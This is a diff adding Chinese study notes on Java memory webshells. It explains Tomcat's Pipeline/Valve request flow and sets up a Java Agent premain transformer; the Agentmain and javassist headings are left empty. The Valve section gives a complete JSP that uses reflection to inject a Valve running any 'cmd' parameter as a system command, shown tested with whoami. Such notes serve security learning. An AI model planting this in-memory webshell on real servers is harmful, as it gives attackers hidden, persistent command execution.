@@ -1635,27 +1635,164 @@ public class HelloController {
 
 
 
-
-
-
-
 # Tomcat Value内存马
 
+## 什么是Value?
+
+![](../image/java内存马学习-66.png)
+
+如图，在Tomcat中，有着Engine、Host、Context、Wrapper四大容器，
+
+1. Engine是Tomcat的顶层容器，管理所有Host（虚拟主机），并根据请求的域名决定选择对应的Host进行处理
+2. Host代表一个虚拟主机，管理若干Context，并根据请求路径决定选择对应的Context处理
+3. Context对应一个应用程序，
+
+- 管理若干资源（Servlet、Filter、JSP、静态文件等）的集合
+- 每个Context之间的类加载器和配置（web.xml）是隔离的
+- 管理session
+
+  4.Wapper管理单个 Servlet 的生命周期和请求处理，执行 Filter 链也是这个容器做的。
+
+请求达到服务器后传递的顺序分别是Engine->Host->Context->Wrapper，但是传递过程并不是容器直接互相调用，而是通过每个容器内部的 管道（Pipeline） 和 阀门（Valve） 机制实现的。这种设计模式是 Tomcat 架构的核心精髓，它让请求像水流一样在容器层级间智能流动。
+
+Valve 是可插拔的请求处理单元，每个 Valve 负责一项独立功能（如日志记录、权限检查、数据压缩等），它们就像水管上的控制阀。
+
+---
+
+## 什么是Pipeline?
+
+Valve是阀门，那么Pipeline就是管道，每个容器内部都有一个专属的 Pipeline，每个Pipeline里面都有一个执行顺序位于最后的基础阀门，负责将请求传递到下层容器的Pipeline，同时我们又可以在每个管道中添加自定义的阀门。
+
+**观察管道接口源码，管道支持通过addValve()方法向管道内添加自定义阀门**
+
+![](../image/java内存马学习-67.png)
+
+---
+
+## 与内存马结合
+
+这套机制让我们看到了与内存马的可能性，但具体来说还是要注意以下几点：
+
+- 该机制是Tomcat中间件的私有实现，不像ServletAPI是通用的
+- 一般来说，优先级是高于Servlet/Filter/Listener和Spring的控制器/拦截器的
+
+**问题变成了，我们要如何拿到容器内的pipeline对象呢**
+
+通过阅读源码，找到容器接口，发现容器接口有一个getPipeline()方法，所以其实现的每个容器均支持getPipeline()方法
+
+![](../image/java内存马学习-68.png)
+
+查看容器接口的实现
+
+![image-20261117105950404](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20261117105950404.png)
+
+所以这四个容器都会有getPipeline()方法
+
+![](../image/java内存马学习-69.png)
+
+---
+
+## 调试观察Value阀门的调用过程
+
+![](../image/java内存马学习-70.png)
+
+在doGet处打断点，然后对MyServlet发起请求访问
+
+记得提前在web.xml中先配置好MyServlet
+
+```
+<?xml version="1.0" encoding="UTF-8"?>
+<web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee"
+         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+         xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd"
+         version="4.0">
+    <servlet>
+        <servlet-name>MyServlet</servlet-name>
+        <servlet-class>com.example.memshell.MyServlet</servlet-class>
+    </servlet>
+    <servlet-mapping>
+        <servlet-name>MyServlet</servlet-name>
+        <url-pattern>/my</url-pattern>
+    </servlet-mapping>
+</web-app>
+```
+
+访问/my路由
+
+![](../image/java内存马学习-71.png)
+
+通过观察调用发现中间有很多invoke方法，这些invoke方法都是来自于不同的阀门上的
 
 
 
+![](../image/java内存马学习-72.png)
 
+比如这个StandardEngineValue
 
+可以看到这里就是Engine的Basic基础阀门，用来调用host的First阀门，请求一开始就是在这些阀门之间传递和流动，中间会经过不同管道的不同阀门
 
+---
 
+## 示例代码
 
+所以我们可以从StandardContext对象入手，构造以下恶意jsp
 
+value.jsp
 
+```
+<%@ page import="org.apache.catalina.core.StandardContext" %>
+<%@ page import="java.lang.reflect.Field" %>
+<%@ page import="org.apache.catalina.core.ApplicationContext" %>
+<%@ page import="org.apache.catalina.valves.ValveBase" %>
+<%@ page import="org.apache.catalina.connector.Request" %>
+<%@ page import="org.apache.catalina.connector.Response" %>
+<%@ page import="java.io.IOException" %>
+<%@ page import="java.io.BufferedReader" %>
+<%@ page import="java.io.InputStreamReader" %>
+<%@ page contentType="text/html;charset=UTF-8" language="java" %>
+<%!
+public class MyValve extends ValveBase {
+  @Override
+  public void invoke(Request req, Response resp) throws IOException, ServletException {
+    String cmd = req.getParameter("cmd");
+    if (cmd != null) {
+      Process proc = Runtime.getRuntime().exec(cmd);
+      BufferedReader br = new BufferedReader(
+              new InputStreamReader(proc.getInputStream()));
+      String line;
+      while ((line = br.readLine()) != null) {
+        resp.getWriter().println(line);
+      }
+      br.close();
+    }
+    next.invoke(req,resp);
+  }
+}
+%>
+<%
+  // 从request中获取servletContext
+  ServletContext servletContext = request.getServletContext();
 
+  // 从servletContext中获取applicationContext
+  Field applicationContextField = servletContext.getClass().getDeclaredField("context");
+  applicationContextField.setAccessible(true);
+  ApplicationContext applicationContext = (ApplicationContext) applicationContextField.get(servletContext);
+  // 从applicationContext中获取standardContext
+  Field standardContextField = applicationContext.getClass().getDeclaredField("context");
+  standardContextField.setAccessible(true);
+  StandardContext standardContext = (StandardContext) standardContextField.get(applicationContext);
+  standardContext.getPipeline().addValve(new MyValve());
+  out.println("inject success");
+%>
+```
 
+重启服务器并访问value.jsp
 
+![](../image/java内存马学习-73.png)
 
+然后任意地址访问?cmd=whoami
 
+![](../image/java内存马学习-74.png)
 
 
 
@@ -1669,7 +1806,222 @@ public class HelloController {
 
 # Agent内存马
 
+## Java Agent
 
+Java Agent是一种可以在JVM启动时或运行时附加的工具，它可以拦截并修改类文件字节码。Java Agent通常用于实现AOP（面向切面编程）、性能监控、日志记录等功能。
+
+Java Agent有两种加载方式：
+
+1. **Premain**：在JVM启动时通过命令行参数-javaagent:path/to/your-agent.jar来指定。
+2. **Agentmain**：在JVM已经启动后，通过Attach API动态地附加到正在运行的JVM进程上。
+
+先来准备一个正在运行的正常程序：
+
+这里用jdk17，新建一个maven项目agent-demo
+
+项目很简单，只有一个简单的Main方法，和一个Fox类。
+
+![](../image/java内存马学习-75.png)
+
+Fox类，一个say方法
+
+```
+package org.mixbp;
+
+public class Fox {
+
+    public void say(){
+        System.out.println("ding ding ding");
+    }
+}
+
+```
+
+程序入口，每隔一秒钟调用一次Fox类的say方法
+
+```
+package org.mixbp;
+
+
+public class Main {
+    public static void main(String[] args) throws InterruptedException {
+        Fox fox = new Fox();
+        while (true) {
+            fox.say();
+            Thread.sleep(1000);
+        }
+    }
+}
+```
+
+---
+
+### premain
+
+premain代理的加载方式是在程序启动时加入参数
+
+```
+java -javaagent:xxx.jar app.jar
+```
+
+其中xxx.jar就是接下来要构造的包
+
+1. 新建一个maven项目。agent
+2. 改一下maven打包设置。配置如下：
+
+```
+<build>
+    <plugins>
+        <plugin>
+            <groupId>org.apache.maven.plugins</groupId>
+            <artifactId>maven-assembly-plugin</artifactId>
+            <configuration>
+                <descriptorRefs>
+                    <descriptorRef>jar-with-dependencies</descriptorRef>
+                </descriptorRefs>
+                <archive>
+                    <manifestEntries>
+                        <Agent-Class>AgentMainTest</Agent-Class>
+                        <Premain-Class>PremainTest</Premain-Class>
+                        <Can-Redefine-Classes>true</Can-Redefine-Classes>
+                        <Can-Retransform-Classes>true</Can-Retransform-Classes>
+                    </manifestEntries>
+                </archive>
+            </configuration>
+            <executions>
+                <execution>
+                    <id>make-assembly</id>
+                    <phase>package</phase>
+                    <goals>
+                        <goal>single</goal>
+                    </goals>
+                </execution>
+            </executions>
+        </plugin>
+    </plugins>
+</build>
+```
+
+加到pom.xml中，改完之后重新加载maven
+
+---
+
+![](../image/java内存马学习-76.png)
+
+创建一个 Premain 类型的Agent 时，需要在 MANIFEST.MF 中指定 Premain-Class 属性JVM 才能在启动时加载指定代理类。
+
+而创建一个Agentmain类型的Agent时，需要在MANIFEST中指定 Agent-Class 属性。JVM才能在运行时加载指定代理类。
+
+Can-Redefine-Classes: true表示允许 Java Agent 重新定义已经加载的类。
+
+Can-Retransform-Classes: true表示允许 Java Agent 重新转换已经加载的类。
+
+然后现在创建Premain Class，注意：类的名字和在`MANIFEST.MF`中指定的`Premain-Class`属性值要一致
+
+`PremainTest.java`
+
+```
+import java.lang.instrument.Instrumentation;
+
+public class PremainTest {
+    public static void premain(String agentArgs, Instrumentation inst){
+        inst.addTransformer(new MyTransformer());
+    }
+}
+```
+
+`public static void premain(String agentArgs, Instrumentation inst`是一个特殊的静态方法，被称为代理主方法（agent main method）。它由JVM调用，允许代理（agent）在目标应用程序启动之前执行初始化操作。
+
+**String agentArgs：**传递给代理的参数是字符串。
+
+**Instrumentation inst：**提供了一组API来检查、修改甚至替换应用程序中的类。
+
+**MyTransformer**是一个实现**ClassFileTransformer**的类，在类中负责具体的类转换工作。
+
+**MyTransformer方法**
+
+```
+import java.io.FileInputStream;
+import java.lang.instrument.ClassFileTransformer;
+import java.lang.instrument.IllegalClassFormatException;
+import java.security.ProtectionDomain;
+
+public class MyTransformer implements ClassFileTransformer {
+
+    @Override
+    public byte[] transform(ClassLoader loader, String className, Class<?> classBeingRedefined,
+                            ProtectionDomain protectionDomain, byte[] classfileBuffer) throws IllegalClassFormatException {
+
+        // 如果正在加载的是这个类，那就对他做替换
+        if (className.equals("org.mixbp.Fox")) {
+            // 去读另一个Fox，也就是用来替换的Fox类，输入编译之后的.class文件的绝对地址
+            return read("E:\\java\\agent\\target\\classes\\org\\mixbp\\Fox.class");
+        }
+
+        return null;
+    }
+
+
+    public static byte[] read(String path)
+    {
+        try {
+            FileInputStream in =new FileInputStream(path);
+            //当文件没有结束时，每次读取一个字节显示
+            byte[] data=new byte[in.available()];
+            in.read(data);
+            in.close();
+            return data;
+        } catch (Exception e) {
+            e.printStackTrace();
+            return null;
+        }
+    }
+
+}
+
+```
+
+
+
+关于此接口方法的参数：
+
+ClassLoader loader: 加载类的类加载器。
+
+String className: 类的全限定名（例如，com/example/MyClass）。 
+
+Class<?> classBeingRedefined: 如果是在重新定义类，则为该类的对象；否则为null。
+
+ProtectionDomain protectionDomain: 类的保护域。 
+
+
+
+
+
+
+
+
+
+
+
+
+
+### Agentmain
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+### javassist
 
 
 
